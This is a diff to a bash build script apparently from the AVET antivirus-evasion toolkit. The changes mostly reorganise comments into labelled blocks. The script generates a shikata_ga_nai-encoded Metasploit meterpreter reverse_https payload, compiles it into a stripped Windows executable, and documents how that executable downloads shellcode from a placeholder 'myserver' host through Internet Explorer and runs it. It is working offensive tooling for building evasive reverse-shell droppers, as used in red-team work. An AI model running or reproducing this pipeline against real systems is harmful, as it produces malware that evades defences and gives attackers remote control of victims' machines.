@@ -1,11 +1,10 @@
 #!/bin/bash        
-# Download the payload via internet explorer and execute.
 
-# The generated msf shellcode file needs to be hosted on a HTTP server.
-# Call the generated executable like:
-# output.exe http://myserver/scclean.txt
-# The executable will then download the shellcode file via internet explorer and drop the file on disk.
-# The shellcode is then read from the file and executed.
+
+#DESCRIPTION_START
+# Download the payload via internet explorer and execute.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -21,9 +20,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > input/sc_c.txt
@@ -49,9 +54,6 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# enable debug output
-enable_debug_print
-
 # compile 
 $win32_compiler -o output/downloadiexplorer_revhttps_win32.exe source/avet.c
 strip output/downloadiexplorer_revhttps_win32.exe
@@ -65,3 +67,11 @@ downloadiexplorer_revhttps_win32.exe http://myserver/scenc_raw.txt
 The executable will then download the shellcode file via internet explorer and drop the file on disk.
 The shellcode is then read from the file and executed."
 
+
+#USAGE_START
+# The generated msf shellcode file needs to be hosted on a HTTP server.
+# Call the generated executable like:
+# downloadiexplorer_revhttps_win32.exe http://myserver/scenc_raw.txt
+# The executable will then download the shellcode file via internet explorer and drop the file on disk.
+# The shellcode is then read from the file and executed.
+#USAGE_END
